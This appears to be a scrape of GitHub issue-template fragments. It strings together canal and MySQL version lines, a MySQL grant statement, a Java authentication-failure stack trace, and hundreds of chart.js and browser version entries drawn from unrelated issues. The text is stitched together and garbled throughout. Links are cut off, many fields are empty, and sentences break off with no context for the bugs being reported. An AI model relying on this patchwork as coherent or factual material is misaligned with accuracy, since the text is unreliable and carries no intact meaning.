* canal version 1.1.5 ast modify mar 13
* canal version : 1.1.4.release canal admin/server ha * mysql version
* canal version 1.1.5-alpha-1
* mysql version 5,7
* canal version
1.1.4 * mysql version
* canal version
* mysql version
* canal version
* mysql version
* canal version v1.1.5-alpha-1
* mysql version 5.7
* canal version
* mysql version
* canal version 1.1.3
* mysql version 5.7
* canal version
* mysql version
* canal version 1.1.3
* mysql version 5.7.22
* kafka version 1.1.1
* canal version 1.1.3
* mysql version 5.7
* canal version 1.1.3-snatshop
* mysql version 8.0.14 mysql :
create user canal identified by 'canal'; grant select, replication slave, replication client on *.* to 'canal'@'%';
grant all privileges on *.* to 'canal'@'%' ;
flush privileges; anal,mysql5.7 , .0.14 , , ```
2019-04-03 13:25:59.063 [destination = example , address = /****:3306 , eventparser] error c.a.o.c.p.inbound.mysql.rds.rdsbinlogeventparserproxy - dump address /47.107.227.75:3306 has an error, retrying
caused by com.alibaba.otter.canal.parse.exception.canalparseexception: java.io.ioexception: connect /47.107.227.75:3306 failure
caused by: java.io.ioexception: connect /****:3306 failure at com.alibaba.otter.canal.parse.driver.mysql.mysqlconnector.connect(mysqlconnector.java:82) ~[canal.parse.driver-1.1.3-snapshot.jar:na] at com.alibaba.otter.canal.parse.inbound.mysql.mysqlconnection.connect(mysqlconnection.java:89) ~[canal.parse-1.1.3-snapshot.jar:na] at com.alibaba.otter.canal.parse.inbound.mysql.mysqleventparser.predump(mysqleventparser.java:86) ~[canal.parse-1.1.3-snapshot.jar:na] at com.alibaba.otter.canal.parse.inbound.abstracteventparser$3.run(abstracteventparser.java:175) ~[canal.parse-1.1.3-snapshot.jar:na] at java.lang.thread.run(thread.java:748) [na:1.8.0_171]
caused by: java.io.ioexception: error when doing client authentication:errorpacket [errornumber=1045, fieldcount=-1, message=access denied for user 'canal'@'****' (using password: yes), sqlstate=28000, sqlstatemarker=#] at com.alibaba.otter.canal.parse.driver.mysql.mysqlconnector.negotiate(mysqlconnector.java:250) ~[canal.parse.driver-1.1.3-snapshot.jar:na] at com.alibaba.otter.canal.parse.driver.mysql.mysqlconnector.connect(mysqlconnector.java:79) ~[canal.parse.driver-1.1.3-snapshot.jar:na] ..
4 common frames omitted
2019-04-03 13:25:59.063 [destination = example , address = /****:3306 , eventparser] error com.alibaba.otter.canal.common.alarm.logalarmhandler - destination:example[com.alibaba.otter.canal.parse.exception.canalparseexception: java.io.ioexception: connect /***:3306 failure
caused by: java.io.ioexception: connect /****:3306 failure at com.alibaba.otter.canal.parse.driver.mysql.mysqlconnector.connect(mysqlconnector.java:82) at com.alibaba.otter.canal.parse.inbound.mysql.mysqlconnection.connect(mysqlconnection.java:89) at com.alibaba.otter.canal.parse.inbound.mysql.mysqleventparser.predump(mysqleventparser.java:86) at com.alibaba.otter.canal.parse.inbound.abstracteventparser$3.run(abstracteventparser.java:175) at java.lang.thread.run(thread.java:748)
caused by: java.io.ioexception: error when doing client authentication:errorpacket [errornumber=1045, fieldcount=-1, message=access denied for user 'canal'@'****' (using password: yes), sqlstate=28000, sqlstatemarker=#] at com.alibaba.otter.canal.parse.driver.mysql.mysqlconnector.negotiate(mysqlconnector.java:250) at com.alibaba.otter.canal.parse.driver.mysql.mysqlconnector.connect(mysqlconnector.java:79) ..
* canal version v1.1.3-alpha-3
* mysql version 5.6
* canal version v1.1.3
* mysql version v5.7.20
* kafka version v1.0
* canal version 1.1.3
* mysql version 5.7
* canal version
* mysql version 5.6
* canal version 1.1.2
* mysql version 8.0.3
* docker version 18.x
* canal version anal.deployer-1.1.0
* mysql version .7
* chart.js version: 3.0.0-beta.4
* browser name and version: chrome 88.0.4306.0
* link to your project: [fiddle](
* chart.js version:
* browser name and version:
* link to your project:
* chart.js version: 2.9.4
* browser name and version: google chrome version 86.0.4240.111 (official build) (x86_64) as i understand this problem also affects the chart.js 3 since there is the same code: #l93
* chart.js version: 2.8.0 * browser name and version: google chrome version 86.0.4240.111 (official build) (x86_64) * link to your project:
(specifically stats.js where chart renderign occurs) <img width="1438" alt="screen shot 2020-10-23 at 4 16 23 am" src=" ">
* chart.js version: dist/master
* browser name and version: ff 82.0
* chart.js version: master/dist
* browser name and version: 81.0.2
* chart.js version: "chart.js": "^2.9.4"
* browser name and version: chrome version 86.0.4240.80 (offizieller build) (x86_64) am i doing something wrong ?
* chart.js version: 2.9.3
* browser name and version: edgium 86.0.622.38
* chart.js version: @coreui/chartjs": "^2.0.0", @coreui/react-chartjs": "^1.0.0",
* browser name and version : google chrome version 86.0.4240.75 (official build) (64-bit), firefox 81.0.2 (64-bit)
* link to your project:
* chart.js version: master/dist
* browser name and version: ff 81.0.2
* chart.js version: 2.9
* browser name and version:
* link to your project:
* chart.js version:
* browser name and version:
* link to your project:
* chart.js version: 2.9.3
* browser name and version: chrome 85
* chart.js version: 2.9.3
* browser name and version: safari & chrome
* link to your project:
the bug is here both in sandbox and my local environment
* chart.js version: 2.9.3
* browser name and version: brave versi 1.14.81 chromium: 85.0.4183.102 (build oficial) (64 bits)
* link to your project:
- chart.js version: 2.9.3
- browser name and version: google chrome version 85.0.4183.121 (official build) (64-bit)
the problem only occurs with chart.js 3.0.0-beta, it works as expected in 2.9.3
tested with current chrome and firefox on windows.
* chart.js version: 2.9.3
* chart.js version: 2.9.3
* browser name and version: google chrome 85.0.4183.102
* link to your project:
* chart.js version: 2.9.3
* browser name and version: works on chrome 85.0.4183.102
i get the error using firefox 81.0b9 and safari 13.1.2 (15609.3.5.1.3).
* chart.js version:2.7.0
* browser name and version: chrome 85
* link to your project:
* chart.js version:
* browser name and version:
* link to your project:
* chart.js version: 2.9.20
* browser name and version: chrome 84.0.4147.135 (official build) (64-bit)
* chart.js version: 2.9.x
* chart.js version: 2.9.3
* browser name and version: chrome version 85.0.4183.83
* link to your project:
* chart.js version: dist/master
* browser name and version: ff 80.0.1
* chart.js version: 2.9.3
* browser name and version: safari on ios 3.6.1 and firefox mobile 28.0
* link to your project:
* chart.js version: 2.5.0
* all browsers
* chart.js version:
* browser name and version:
* link to your project:
* chart.js version: latest
* browser name and version: chrome 84.0.4147.105
* link to your project: private
* chart.js version: 3.0.0-aplha.2 (master)
* browser name and version: chrome 84
* chart.js version: 3 alp2
* browser name and version: mozilla 79.0 * link to your project:
* chart.js version:
* browser name and version:
* link to your project:
* chart.js version: 2.9.3
* browser name and version: firefox 79.0
* chart.js version: `2.9.3`
* chart.js version:
* browser name and version:
* link to your project:
chart.js 2.6.0
google chrome 83 / firefox 78
* chart.js version:
* browser name and version:
* link to your project:
* chart.js version:
* browser name and version:
* link to your project:
* chart.js version: 3.0.0-alpha.2
* browser name and version:
* link to your project:
* chart.js version: dist/master
* browser name and version: ff 78.0.2
* chart.js version: dist/master
* browser name and version: ff 78.0.2
* chart.js version: dist/master
* browser name and version: ff 78.0.2
* chart.js version: 3.0-apha.2
* browser name and version:
* link to your project:
* chart.js version: 3.0-alpha.2
* browser name and version:
* link to your project:
* chart.js version:
* browser name and version: 83.0.4103.116
* chart.js version: 2.7.2 then 2.9.3
* browser name and version: firefox 78.0.1
* link to your project: the page showed above is from a private project, i guess i can reproduce it elsewhere if really needed
* chart.js version: dist/master
* browser name and version: ff 78.0.1
* chart.js version: 2.9.3
* browser chrome 83.0.4 debugging shows, that somehow the click event is handled twice (with animation.duration: 0)
so the dataset is set hidden and immediately visible with one mouse click.
* chart.js version:
* browser name and version: chrome 83.0.4103.116 (
chart.js version: 2.9.3 browser: firefox nightly project: (deployed [here](
* chart.js version: 2.9.3
* browser name and version: safari
* link to your project:
* chart.js version: `master`
* browser name and version: chrome 83
* chart.js version: 3.0.0-alpha
* chart.js version: dist/master
* browser name and version: ff 77.0.1
* chart.js version: 2.9.3
* browser name and version: google chrome (version 83.0.4103.106) [should not matter]
* chart.js version: 2.9.3
* browser name and version: chrome 83
* link to your project: i used mixed charts, stacked bar and line.
issue is bar is showing over the lines.
i have set order attribute for each dataset object, is there any thing wrong ?
thanks in advance
* chart.js version: 2.9.3
* browser name and version: safari 13.1.1, chrome 83.0.4103.106, firefox 77.0.1
* chart.js version: dist/master
* browser name and version: ff 77.0.1
* chart.js version: 2.9.3
* moment.js version : 2.26.0
* browser name and version: firefox 77.0.1 , chrome 83.0.4103.106
* chart.js version:
* browser name and version: chrome version 83.0.4103.97
* chart.js version: 2.9.3
* browser name and version: chrome 81.0.4044.138 (official build) (64-bit)
* chart.js version: dist/master
* browser name and version: ff 77.0.1
* chart.js version: v3.0.0-alpha
* browser name and version: chrome * link to your project:
* chart.js version: 2.9.3
* browser name and version: all updated
* link to your project:
* chart.js version:
* browser name and version:
* link to your project:
* chart.js version: dist/master
* browser name and version: ff 77.0.1
* chart.js version: dist/master
* browser name and version: ff 77.0.1
* chart.js version: 2.9.3
* browser name and version: chrome 83.0.4103.97 (x64) on windows 10 pro
* chart.js version: v2.9.3
* browser name and version: version 80.0.3987.163 (official build) (64-bit)
* link to your project: covid.kylebaker.io
* chart.js version: 2.8.0
* browser name and version: all
* link to your project:
vue.js version: 2.5.17
vue-chart.js version: 2.9.3
npm version: 6.13.1
chrome-browser - version 83.0.4103.61 originally raised it [here]( but was pointed to this repo.
this issue may hold true for other charts as well, but i only tested it for this doughnut chart.
using the cdn for version 2.9.3: i also posted this same question on stack overflow:
if you have an answer here, please feel free to get some extra so karma
i will certainly upvote any help! thank you!
* chart.js version:
* browser name and version:
* link to your project:
* chart.js version: devbuild:
* browser name and version: ff 76.0.1
* chart.js version: devbuild:
* browser name and version: ff 76.0.1
* chart.js version: 2.7.3
* browser name and version: chrome 81.0.4044.138
* link to your project:
* chart.js version: 2.9.3
* browser name and version: firefox 76.0.1
* link to your project:
* chart.js version: master
* browser name and version: ff 76.0.1 (64-bit) , chrome 83.0.4103.61
* chart.js version: 2.9.3 with vuechartjs.mixins.reactiveprop
* browser name and version: firefox and chrome
* link to your project:
* chart.js version: v3.0.0-alpha
* browser name and version: chrome
* link to your project:
* chart.js version: v2.9.3 and v3.0.0-alpha
* browser name and version: chrome 81.0.4044.138
* link to your project:
* chart.js version: 2.9.3
* browser name and version: chrome 81.0.4044.138, firefox 68.8.0esr, internet explorer 11.719.18362.0
* chart.js version: 3 master
* browser name and version: edge version 84.0.508.0 (version officielle) dev (64 bits)
* chart.js version: 2.9.3
* browser name and version: chrome, firefox (latest version)
* resolution: 1920 x 1080 (native)
* chart.js version: 3.0.0-alpha
* browser name and version: 81.0.4044.129
* link to your project: n/a
* chart.js version: 2.9.3
* browser name and version: chrome 81.0.4044.129
* link to your project: n/a
* chart.js version: 2.9.3
* browser name and version: chrome 81.0.4044.113
* link to your project:
* chart.js version: 2.9.3
* browser name and version: chrome version 81.0.4044.113 (official build) (64-bit), firefox 75.0 (64-bit)
* chart.js version: chart.js/3.0.0-alpha (experiencing the same bug on `master`
* browser name and version: chrome 81.0
* chart.js version: 2.9.3
* browser name and version: chrome 81.0.4044.129 (official build) (64-bit)
* chart.js version: 2.9.3
* momentjs version: 2.25.1
* browser name and version: chrome 81.0.4044.129
* chart.js version: 2.9.3
* chart.js version: 2.9.3
* browser name and version: chrome (79.0.3945.130), firefox (68.3.0esr), microsoft edge (44.18362.449.0), internet explorer (11.719.18362.0)
* [link to project](
* chart.js version:
* browser name and version:
* link to your project: broken after version 2.8.0 (running on debian 10 with chrome and firefox).
* chart.js version: 3.0.0-alpha
* browser name and version: microsoft edge version 84.0.488.1 (official build) dev (64-bit)
i'm using angular
"dependencies": { "@angular/animations": "~9.0.6", "@angular/cdk": "^9.0.6", "@angular/common": "~9.0.6", "@angular/compiler": "~9.0.6", "@angular/core": "~9.0.6", "@angular/forms": "~9.0.6", "@angular/localize": "^9.0.6", "@angular/platform-browser": "~9.0.6", "@angular/platform-browser-dynamic": "~9.0.6", "@angular/router": "~9.0.6", "@ng-bootstrap/ng-bootstrap": "^6.0.0", "@ngx-translate/core": "^11.0.1", "@ngx-translate/http-loader": "^4.0.0", "bootstrap": "^4.4.1", "chart.js": "^2.9.3", "moment": "^2.22.2", "ngx-reactivetoolkit": "^7.0.0", "rxjs": "~6.5.4", "tslib": "^1.10.0", "zone.js": "~0.10.2" }, "devdependencies": { "@angular-devkit/build-angular": "~0.900.6", "@angular-devkit/build-ng-packagr": "~0.900.6", "@angular/cli": "~9.0.6", "@angular/compiler-cli": "~9.0.6", "@angular/language-service": "~9.0.6", "@commitlint/cli": "^8.3.4", "@commitlint/config-conventional": "^8.3.4", "@commitlint/config-lerna-scopes": "^8.3.4", "@types/node": "^12.11.1", "@nrwl/jest": "^8.11.0", "@types/jest": "^24.9.0", "codelyzer": "^5.0.0", "commitizen": "^4.0.3", "commitlint": "^8.3.4", "cz-lerna-changelog": "^2.0.2", "fs-extra": "^8.1.0", "husky": "^4.0.0", "jest": "^24.9.0", "jest-cli": "^24.9.0", "jest-preset-angular": "^7.0.0", "lerna": "^3.20.2", "ng-packagr": "^5.4.0", "prettier": "^1.19.1", "pretty-quick": "^2.0.1", "protractor": "~5.4.0", "rxjs-marbles": "^5.0.4", "shelljs": "^0.8.3", "ts-jest": "^24.3.0", "ts-node": "~7.0.0", "tsickle": "^0.37.0", "tslint": "~5.20.1", "typescript": "~3.7.5", "sass-rem": "^2.0.0" }, "config": { "commitizen": { "path": "./node_modules/cz-lerna-changelog" } }, "husky": { "hooks": { "commit-msg": "commitlint -e husky_git_params", "pre-commit": "pretty-quick --staged **/*.ts" } } ```
* chart.js version: 2.9.3
* browser name and version: all
* link to your project:
* chart.js version: 2.9.3
* browser name and version: chrome 80+
* chart.js version: 2.9.3
* browser name and version: chrome * link to your project:
* chart.js version: 3.0.0-alpha
* browser name and version: chrome 80
* chart.js version: 2.9.3
* browser name and version: firefox latest (74) and chromium latest (80)
* chart.js version: 3.0.0 alpha
* browser name and version: edge version 83.0.461.1 (official) dev (64 bits)
* chart.js version: master branch
* browser name and version: chrome v80.0
* link to your project: #external-custom-tooltips
* chart.js version: 3.0.0-alpha
* browser name and version: chrome version 80.0.3987.132 (official build) (64-bit)
* link to your project: n/a
* chart.js version: 2.9.3
* browser name and version: chrome 80
* link to your project:
* chart.js version: 3.0.0-alpha
* browser name and version: chromium 80
* chart.js version: 2.8.0
* browser name and version: chrome v80.0
* link to your project: [
* chart.js version: 2.9.3 (for real), but it's also buggy on master (see codepen)
* browser name and version: firefox 73
* link to your project: not publicly available
* chart.js version: 2.9.3
* browser name and version: chrome, v81.0.4044.69
* link to your project:
* chart.js version: 2.9.3
* browser name and version: safari on osx
version: "chart.js": "^2.9.3"
framework: nuxt js
google chrome #configuration
```javascript
options: { title: { display: false }, legend: { labels: { fontsize: 15, fontcolor: 'white' } }, responsive: true, maintainaspectratio: false, scales: { xaxes: [ { type: 'time', distribution: 'series', gridlines: { display: false }, ticks: { fontcolor: 'white' } } ], yaxes: [ { gridlines: { display: false }, ticks: { display: false } } ] } } }
```javascript
swing trade
[{"x":"[native date sun jun 30 2019 00:00:00 gmt+0100 (irish standard time)]","y":"261.80"},{"x":"[native date wed jul 31 2019 00:00:00 gmt+0100 (irish standard time)]","y":"212.02"},{"x":"[native date sat aug 31 2019 00:00:00 gmt+0100 (irish standard time)]","y":"97.83"},{"x":"[native date mon sep 30 2019 00:00:00 gmt+0100 (irish standard time)]","y":"377.35"},{"x":"[native date thu oct 31 2019 00:00:00 gmt+0000 (greenwich mean time)]","y":"1144.97"},{"x":"[native date sat nov 30 2019 00:00:00 gmt+0000 (greenwich mean time)]","y":"72.10"},{"x":"[native date tue dec 31 2019 00:00:00 gmt+0000 (greenwich mean time)]","y":"595.14"}] day trade
[{"x":"[native date sun jun 30 2019 00:00:00 gmt+0100 (irish standard time)]","y":"-12.38"},{"x":"[native date wed jul 31 2019 00:00:00 gmt+0100 (irish standard time)]","y":"-4.55"},{"x":"[native date mon sep 30 2019 00:00:00 gmt+0100 (irish standard time)]","y":"0.77"},{"x":"[native date tue dec 31 2019 00:00:00 gmt+0000 (greenwich mean time)]","y":"-0.61"}]
``` #html elements
![image](
* chart.js version: 2.9.3
* browser name and version: firefox nightly (mar 2020)
* chart.js version: 2.9.3
* browser name and version: all
* link to your project:
* chart.js version: 2.9.3
* browser name and version: chrome version 80.0.3987.122
* chart.js version: ^2.9.3
* browser name and version: chrome 80.0.3987.116 64-bit
* chart.js version: v2.9.3
* chart.js version: 2.9.3
* browser name and version: chrome 79
* chart.js version: 2.9.3
* browser name and version: google chrome version 80.0.3987.100
* chart.js version: 2.9.3
* browser name and version: chrome version 79.0.3945.130
* link to your project:
* chart.js version: 2.9.3
* browser name and version: firefox 72.0.2
* link to your project:
* chart.js version: `master`
* chart.js version: 2.9.3
* browser name and version: chrome 79.0.3945.130
* link to your project: /
* chart.js version: chart.js v2.9.3
* browser name and version: chrome 79.0.3945.130 (official build) (64-bit)
* chart.js version: master
* browser name and version:
* link to your project:
* chart.js version: v2.9.3
* browser name and version: chrome 79
* wkhtmltopdf: 0.12.5
* chart.js version:2.7.2
* browser name and version: all , tried on chrome
* link to your project:
* chart.js version: v2.9.3
* browser name and version: chrome version 79.0.3945.117 (official build) (64-bit)
* link to your project:
* chart.js version: master
* browser name and version: chromium 79
* chart.js version: master
* browser name and version: chromium 79
* chart.js version: >2.8.0
* browser name and version: chrome 79 (79.0.3945.117) & ie 11
* configuration:
{ type: 'bar', data: { labels: ['dateset 1', 'dateset 2', 'dateset 3', 'dateset 4', 'dateset 5'], datasets: [ { label: 'green', data: [308.38, 265.49, 272.79, 306.44, 336.44], backgroundcolor: 'green', bordercolor: 'white', borderskipped: false, borderwidth: 6, hoverborderwidth: 6 }, { label: 'red', data: [391.4, 427.41, 296.67, 351.51, 380.83], backgroundcolor: 'red', bordercolor: 'white', borderskipped: false, borderwidth: 6, hoverborderwidth: 6 }, { label: 'black', data: [386.08, 512.74, 331.05, 380.83, 445.68], backgroundcolor: 'black', bordercolor: 'white', borderskipped: false, borderwidth: 6, hoverborderwidth: 6 }, { label: 'blue', data: [340.7, 568.65, 454.08, 284.27, 640.98], backgroundcolor: 'blue', bordercolor: 'white', borderskipped: false, borderwidth: 6, hoverborderwidth: 6 }, { label: 'rebeccapurple', data: [280.79, 595.62, 516.52, 379.53, 735.92], backgroundcolor: 'rebeccapurple', bordercolor: 'white', borderskipped: false, borderwidth: 6, hoverborderwidth: 6 } ]
``` if it's planned behavior, although line looks strange
lines aren't drawing on the all sides always.
* chart.js version: latest code from master
* browser name and version: chrome 79.0.3945.117
* link to your project:
chart.js version: 2.9.3
browser name and version: safari version 13.0.3 (15608.3.10.1.4), chrome 79.0.3945.88, but i don't think this is browser-related
* chart.js version: v2.9.3
* browser name and version: google chrome 79.0.3945.88 (official build) (64-bit)
* chart.js version:
* browser name and version:
* link to your project:
* chart.js version: 2.8.0
* browser name and version: latest chrome (jan 2020)
* link to your project:
* chart.js version: 2.9.3
* browser name and version: safari version 13.0.3 (15608.3.10.1.4), chrome 79.0.3945.88, but i don't think this is browser-related
* chart.js version: master
* chart.js version: master
* chart.js version: "2.9.3"
* browser name and version: chrome
chart.js 2.9.3
fiddle example above
* chart.js version: master
* chart.js version: 2.8.0 and 2.9.3
* browser name and version: chrome 79.0.3945.79, firefox 71.0, edge
version cited 2.9.3, same issue as reported in 2017.
chrome, safari and firefox all same behaviour.
* chart.js version: >2.7.3
* browser name and version: chrome 78.0.3904.108
* link to your project:
* chart.js version: codepen version (2.5.0), 2.9.3 (with reactjs)
* browser name and version: safari 13.0.3, safari 11.0.3
* link to your project:
* chart.js version: 2.9.3
* browser name and version: chrome 78 (windows)
* link to your project: n/a
* chart.js version: both 2.8.0 and 2.9.3 produces error
* browser name and version: safari 12.0.2
* link to your project: private github repository
will give access if needed.
* chart.js version: 2.9.3
* browser name and version: firefox 70.0.1 (64-bit); chrome 78.0.3904.108 (official build) (64-bit)
* chart.js version: 2.9.x
* browser name and version: all browsers
* chart.js version: 2.9.3
* browser name and version: firefox 70.0.1
* chart.js version: master
* node v12.13.0
* link to your project:
* chart.js version: 2.9.3
* browser name and version: ff 70.0.1
* chart.js version: 2.9.2
* browser name and version: chrome version 78.0.3904.97 (official build) (64-bit)
* link to your project: (
* browser name and version: chrome
* link to your project:
* chart.js version: 2.9.1
* ie11 11.418.18362.0
* link to test which fails:
* chart.js version: 2.9.1
* browser name and version: na
chartjs 2.9.* all is fine with 2.8
* chart.js version: v2.9.1
* browser name and version: google chrome and firefox
* link to your project:
* chart.js version: 2.9.1
* browser name and version: firefox developer edition, chrome latest
* link to your project:
* chart.js version: 2.9.1
* browser name and version: chrome 78
* link to your project: n/a
* chart.js version: 2.9.1
* browser name and version: ie 11 and ms edge
* chart.js version: 2.9.0
* browser name and version: firefox 70
* link to your project:
* chart.js version: 2.9.0
* browser name and version: chromium 78, linux
* chart.js version: chart.js 2.9.0
* browser name and version: chrome 78
* chart.js version: 2.8.0
* browser name and version: chrome 78.0.3904.63 (official build) beta (64-bit)
* link to your project: -
* chart.js version: 2.8.0
* browser name and version: all browsers * link to your project:
* chart.js version: 2.8.0
* browser name and version: chrome
* chart.js version: 2.8.0
* browser name and version: chrome version 77.0.3865.90 (official build) (64-bit)
* link to your project:
* chart.js version: 2.8.0
* chart.js version: "chart.js": "2.8.0" and whatever codepen uses
* browser name and version: mozilla firefox 68.0
* chart.js version: 2.7.2
* browser name and version: chrome, 76.0.3809.100 official
* link to your project: cannot disclose
* chart.js version: 2.8.0
* browser name and version: firefox 69.0.1 ![screenshot_2019-09-25 line chart - combo time scale](
* chart.js version: 2.8.0
* browser name and version: chrome 75.0
* link to your project: xxx
* chart.js version: 2.8.0
* browser name and version: firefox 60.7.2esr, but browser independent
* chart.js version: 2.8
* browser name and version: ie 11.950.17134.0
* link to your project:
* chart.js version: master vs 2.8.0
* browser name and version: chrome
* link to your project:
* chart.js version: 2.8.0
* browser name and version: edge, chrome 76.0.3809.100 (official build) (64-bit)
* link to your project: (does not work from outside because of firewalls)
* chart.js version: 2.8.0
* browser name and version: chrome, 75
* link to your project:
* chart.js version: 2.8.0
* browser name and version: google chrome 76.0.3809.100 (official build) (64-bit)
* chart.js version: 2.8.0
* browser name and version: chrome latest
* chart.js version: 2.8.0
* browser name and version: mozilla firefox 68.0.1
* chart.js version: `2.8.0/chart.bundle.min.js` from cdn
* browser name and version: edge
* chart.js version: [cdn]( 2.8.0, `chart.js/2.8.0/chart.bundle.min.js`
* browser name and version: tried on safari and chrome.
* chart.js version:
* browser name and version:
* link to your project:
* chart.js version:2.8
* browser name and version:edge
* chart.js version: 2.80
* browser name and version: chrome 75
* chart.js version:
* browser name and version:
* link to your project:
* chart.js version: 2.8.0
* browser name and version: chrome on mac: 75.0.3770.142 i've seen elsewhere that zoom plug-in has a known issue where dots get cropped off
but i am not using zoom or any other plug-in.
* chart.js version: v2.8.0
* browser name and version: brave version 0.66.101 chromium: 75.0.3770.142 (official build) (64-bit)
* link to your project:
* chart.js version: 2.8.0 dist/chart.bundle.min.js
* browser name and version: chrome 75.0.3770.142
* chart.js version: devbuild:
* browser name and version: ff 68.0
* chart.js version: 2.8.0
* browser name and version: chrome 75.0.3770.142
* chart.js version:
* browser name and version:
* link to your project:
version 75.0.3770.100 (offizieller build) (64-bit)
* chart.js version: 2.8.0
* browser name and version: safari 12.1.1
* link to your project: private (however the code pen is representative of what i am attempting to do)
* chart.js version: 2.8.0
* browser name and version: firefox 68.0
* link to your project:
* chart.js version: 2.8.0
* browser name and version: electron 5.0.6 // chrome 73.0.3683.121 // nodejs: 12 // v8: 7.3.492.27-electron.0
* link to your project: _currently not on github, still early development_ thank you all for this great, great library! cheers! :)
* chart.js version: 2.8.0
* browser name and version: any
* link to your project: n/a, codepen provided:
* chart.js version: 2.8.0
* browser name and version: google chrome version 75.0.3770.100 (official build) (64-bit)
* chart.js version:
* browser name and version:
* link to your project:
* chart.js version: 2.8.0
* browser name and version: brave version 0.65.118 chromium: 75.0.3770.80 (official build) (64-bit)
* link to your project: (no project)
* chart.js version: 2.8.0
* browser name and version: chrome 74 / firefox 69
* chart.js version: 2.8.0
* browser name and version: firefox 60.6.2esr (32-bit)
* chart.js version: 2.8.0
* browser name and version: version 12.1 (14607.1.40.1.4) <img width="567" alt="screen shot 2019-05-31 at 07 00 26" src=" "> i have attached the output that shows y-axis with no scale labels.
* chart.js version: version 2.8.0
* browser name and version: safari version 12.1 (14607.1.40.1.4)
* link to your project:
* chart.js version: 2.8.0
* browser name and version: firefox 67.0 on win10
* link to your project: nope
* chart.js version: latest
* browser name and version: any
* link to your project: private
* chart.js version: 2.8.0
* browser name and version: chrome 74
* chart.js version: latest
* browser name and version: any
* link to your project:
* chart.js version: 2.8.0
* browser name and version: safari 12.1, firefox nightly.
* link to your project: not online
* chart.js version: 2.8.0
* browser name and version: chrome
* link to your project:
* chart.js version: latest
* browser name and version: all
* chart.js version: 2.8.0
* browser name and version: - 5.0 (ipad; cpu os 12_2 like mac os x) applewebkit/605.1.15 (khtml, like gecko) fxios/14.0b12646 mobile/15e148 safari/605.1.15 - 5.0 (iphone; cpu iphone os 12_3 like mac os x) applewebkit/605.1.15 (khtml, like gecko) fxios/14.0b12646 mobile/15e148 safari/605.1.15
* chart.js version:
* browser name and version:
* link to your project:
* chart.js version: the current one used for the polar chart documentation page of chart.js and 2,7.3
* browser name and version: chrome 73.0.3683.103
* chart.js version: "react-chartjs-2": "^2.7.4"
* browser name and version: safari 12.1 (13607.1.40.1.5)
brave browser 0.62.51 chromium: 73.0.3683.103 (macos)
chart.js version 2.8.0 being used as part of an angular 6 application
browser used for testing is chrome version 70.0.3538.77 (official build) (64-bit) running on top of lubuntu
demonstrative formats:
* chart.js version:
* browser name and version:
* link to your project:
google chrome 73.0.3683.103
* chart.js version: 2.7.0
* browser name and version: chrome 73
* chart.js version: 2.8.0
* browser name and version: chrome 72
* chart.js version: 2.5.0
* browser name and version: google chrome version 70.0.3538.77 (official build) (64-bit)
chart.js version 2.8.0 being used as part of an angular 6 application
browser used for testing is chrome version 70.0.3538.77 (official build) (64-bit) running on top of lubuntu.
* chart.js version: 2.8.0
* chart.js version: 2.8.0
* browser name and version: ff 65.0.2
* chart.js version:
* browser name and version:
* link to your project:
* chart.js version:
* browser name and version:
* link to your project:
* chart.js version: 2.7.3
* browser name and version: firefox 63.0.3 (64-bit)
* other libs: jquery 3.3.1
* chart.js version: 2.7.3
* browser name and version: google chrome v72.0.3626.119 | cefsharp v69
* chart.js version: 2.7.3
* moment.js version: 2.24.0
* browser name and version: any
* chart.js version: 2.7.3
* browser: chrome: 71.0.3578.98
* chart.js version: 2.7.3
* browser name and version: firefox quantum 63.0.3 (64-bit), google chrome version 72.0.3626.109 (official build) (64-bit)
mac os mojave
safari 12.0.3
chrome 72.0.3626.109
chartjs 2.7.3
* chart.js version: 2.7.3
* browser name and version: chrome (72.0.3626.96)
** * chart.js version: 2.7.3
* browser name and version: chrome 71.0.3578.80
* chart.js version: latest (_2.7.3_)
* browser name and version: chrome, latest (_72_)
* link to your project: [codepen](
* chart.js version: 2.7.2
* browser name and version: chrome if there is any way to get the onclick only on the box of the chart (axes and everything inside), please let me know! couldn't figure it out myself
* chart.js version:
* browser name and version:
* link to your project:
* chart.js version: 2.7.3
* browser name and version: version 71.0.3578.98 (official build) (64-bit)
chart.js version: 2.7.3
browser name and version: noted in chrome 71, firefox 64.
* chart.js version: 2.7.3
* browser name and version: firefox 65.0 beta
* link to your project:
* build system: rollup
* chart.js version: 2.7.3
* browser name and version: google chrome 71.0.3578.98 thank you for a great library! let me know if you need any more details
happy to help fixing this, but don't have too much context on internals of axis scaling.
* chart.js version: latest * browser name and version: chrome latest
* chart.js version: 2.4.0 and later
* browser name and version: all
* chart.js version: ^2.7.3
* browser name and version:chrome 70/71 and firefox 63/64
* chart.js version: 2.7.3
* browser name and version: chrome 71.0.3578.80 (official build) (64-bit)
* chart.js version: 2.7.3
* moment.js version: 2.22.2
* browser name and version: firefox 63.0.3 (64-bit) on windows 10
* link to your project:
* chart.js version: 2.7.3
* browser name and version: firefox quantum 63.0 (64-bit)
* link to your project:
* chart.js version: 2.7.3
* browser name and version: chrome 70.0.3538.102 and edge
* link to your project:
* chart.js version: 2.7.3
* patternomaly version: 1.3.2
* browser name and version: chrome v70.0
* link to your project:
* chart.js version: 2.7.3
* browser name and version: chrome version 70.0.3538.77 (official build) (64-bit)
* chart.js version: 2.5.0, reproducible in 2.7.3
* browser name and version: firefox quantum 62.0.3 (64-bit)
* chart.js version: 2.7.3
* browser name and version: all
* chart.js version: 2.7.2
* browser name and version: chrome(latest)
* link to your project:
chart.js 2.7.1
* chart.js version: 2.x
* browser name and version: firefox/chrome/ie/edge latest
* angular 6
* chart.js version: latest (2.7.2)
* browser name and version: ff 63 and ie 11
* chart.js version: 2.7.2
* browser name and version: any
chart.js latest
* chart.js version: 2.7.2
* browser: chrome, firefox, probably all browsers jsfiddle:
stackoverflow:
* chart.js version: 2.7
* chart.js version: latest (2.7.2)
* browser name and version: ms edge (latest)
* link to your project:
* chart.js version: 2.7.2
* browser name and version: firefox 61.0.1, chrome 68.0.3440.84
* chart.js version: 2.7.2
* browser name and version: firefox 61.0.1
* chart.js version: 2.7.2
* browser name and version: firefox (61.0.1) and chromium (68.0.3440.75)
* link to your project:
* chart.js version: 2.7.2
* browser name and version: chrome, firefox
* chart.js version: 2.7.2
* chart.js version: 2.7.1
* browser name and version: ie 11
* link to your project: i have attached the code along with the issue
please take a look at it and let me know, if i am missing something, thanks in advance.
* chart.js version: 2.7.2
* browser name and version: chrome 67.0.3396.99
* chart.js version: latest version * browser name and version: chrome latest version ![image](
* chart.js version: 2.7.2
* browser name and version: chrome 67
* chart.js version: 2.72
* browser name and version: chrome 67.0.3396.87
* chart.js version: 2.7.2
* chart.js version: 2.7.2
* browser name and version: all
* link to your project:
